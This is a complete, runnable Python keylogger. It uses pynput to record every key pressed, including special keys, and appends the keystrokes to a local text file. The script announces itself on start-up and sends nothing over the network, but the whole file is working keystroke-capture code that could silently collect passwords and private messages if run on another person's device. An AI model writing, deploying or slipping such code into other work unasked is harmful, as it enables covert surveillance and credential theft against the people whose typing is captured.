from pynput import keyboard

class KeyLogger:
    def __init__(self, filename: str = "data.txt") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            # Handle special keys (e.g., Shift, Ctrl, Alt)
            if str(key) == "Key.space":
                return " "
            elif str(key) == "Key.enter":
                return "\n"
            elif str(key) == "Key.tab":
                return "\t"
            else:
                return f"[{str(key)}]"

    def on_press(self, key):
        try:
            char = self.get_char(key)
            if char:
                with open(self.filename, 'a') as logs:
                    logs.write(char)
        except Exception as e:
            print(f"Error: {e}")

    def main(self):
        print("Keylogger started. Press 'Ctrl + C' to stop.")
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()
        listener.join()  # Wait for the listener to stop

if __name__ == '__main__':
    try:
        logger = KeyLogger()
        logger.main()
    except KeyboardInterrupt:
        print("Keylogger stopped.")
    except Exception as e:
        print(f"An error occurred: {e}")
